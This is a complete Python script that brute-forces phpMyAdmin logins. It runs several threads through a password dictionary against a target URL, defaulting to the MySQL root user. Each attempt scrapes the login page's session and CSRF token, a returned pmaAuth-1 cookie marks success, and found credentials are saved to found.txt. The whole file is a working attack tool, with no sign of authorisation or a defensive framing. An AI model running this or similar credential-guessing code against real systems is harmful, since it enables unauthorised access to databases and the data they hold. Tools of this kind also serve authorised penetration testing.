#!/usr/bin/env python3
import requests
import html
import re
import os
import argparse
import threading
import time


def thread_function(index):
	while len(passwords) != 0:
		password = passwords.pop(0)
		if login(url, username, password):
			print("[*] FOUND - %s / %s / thead %s" % (username, password,(index+1)))
			f = open("found.txt", "w")
			f.write("%s / %s\n" % (username, password))
			f.close()
			break
		else:
			print("[!] FAILED - %s / %s / thead %s" % (username, password,(index+1)))

def login(url, username, password):
	for i in range(3):
		try:
			res = requests.get(url)
			cookies = dict(res.cookies)
			data = {
				'set_session': html.unescape(re.search(r"name=\"set_session\" value=\"(.+?)\"", res.text, re.I).group(1)),
				'token': html.unescape(re.search(r"name=\"token\" value=\"(.+?)\"", res.text, re.I).group(1)),
				'pma_username': username,
				'pma_password': password,
			}
			res = requests.post(url, cookies=cookies, data=data)
			cookies = dict(res.cookies)
			return 'pmaAuth-1' in cookies
		except:
			pass
	return False

def main():
	global url
	global username
	global passwords
	global threadlist

	parser = argparse.ArgumentParser(description='e.g. python3 %s -url http://example.com/pma/ -user root -dict password.txt -threads 2' % (os.path.basename(__file__)))
	parser.add_argument('-url', help='The URL of target website')
	parser.add_argument('-user', default='root', help='The username of MySQL (default: root)')
	parser.add_argument('-dict', default='password.txt', help='The file path of password dictionary (default: password.txt)')
	parser.add_argument('-threads', default='1', help='How  many threads to use (default: 1)')

	args = parser.parse_args()
	url = args.url
	username = args.user
	dictionary = args.dict
	threads = args.threads



	if url is None:
		parser.print_help()
		return

	try:
		f = open(dictionary, "r")
		passwords = re.split("[\r\n]+", f.read())
		f.close()
	except:
		print("[-] Failed to read '%s' file." % (dictionary))
		return

	threadlist = list()
	for index in range(int(threads)):
		print("create and start thread ", (index+1))
		x = threading.Thread(target=thread_function, args=(index,))
		threadlist.append(x)
		x.start()

	for index, thread in enumerate(threadlist):
		#print("Main    : before joining thread %d.", index)
		thread.join()
		#print("Main    : thread %d done", index)

if __name__ == '__main__':
	main()
